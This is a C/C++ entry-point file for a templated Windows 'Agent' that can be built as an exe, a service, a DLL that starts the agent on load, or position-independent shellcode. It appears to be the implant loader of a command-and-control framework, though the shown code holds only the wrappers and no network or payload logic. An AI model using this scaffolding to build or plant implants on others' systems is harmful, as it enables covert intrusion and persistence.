// __NAME__ Agent — Entry Point
//
// Build variants selected via preprocessor:
//   - Default: standalone exe
//   - BUILD_SVC: Windows service
//   - BUILD_DLL: DLL entry (DllMain)
//   - BUILD_SHELLCODE: position-independent shellcode
//

#include "impl/Agent.h"
#include "config.h"
#ifdef _WIN32
#include <winsock2.h>
#endif
#include <windows.h>

// Forward declaration
DWORD WINAPI AgentMain(LPVOID lpParam);

// ─── Entry Point Variants ──────────────────────────────────────────────────────

#if defined(BUILD_SVC)

SERVICE_STATUS        g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE g_hStatus;

void WINAPI ServiceMain(DWORD argc, LPSTR* argv);
void WINAPI ControlHandler(DWORD request);

int main()
{
    CHAR* svcName = getServiceName();
    SERVICE_TABLE_ENTRYA ServiceTable[] = {
        { svcName, (LPSERVICE_MAIN_FUNCTIONA)ServiceMain },
        { NULL, NULL }
    };
    StartServiceCtrlDispatcherA(ServiceTable);
    return 0;
}

void WINAPI ServiceMain(DWORD argc, LPSTR* argv)
{
    CHAR* svcName = getServiceName();
    g_hStatus = RegisterServiceCtrlHandlerA(svcName, ControlHandler);
    g_ServiceStatus.dwServiceType      = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState     = SERVICE_RUNNING;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    SetServiceStatus(g_hStatus, &g_ServiceStatus);
    AgentMain(NULL);
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_hStatus, &g_ServiceStatus);
}

void WINAPI ControlHandler(DWORD request)
{
    switch (request) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    }
    SetServiceStatus(g_hStatus, &g_ServiceStatus);
}

#elif defined(BUILD_DLL)

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, AgentMain, NULL, 0, NULL);
    }
    return TRUE;
}

#elif defined(DEBUG)

int main()
{
    AgentMain(NULL);
    return 0;
}

#else

int main()
{
    AgentMain(NULL);
    return 0;
}

#endif

// ─── Agent Main ────────────────────────────────────────────────────────────────

DWORD WINAPI AgentMain(LPVOID lpParam)
{
    (void)lpParam;

    Agent* agent = new Agent();
    if (!agent) {
        return 0;
    }

    agent->Run(getProfile(), getProfileSize());

    delete agent;
    return 0;
}
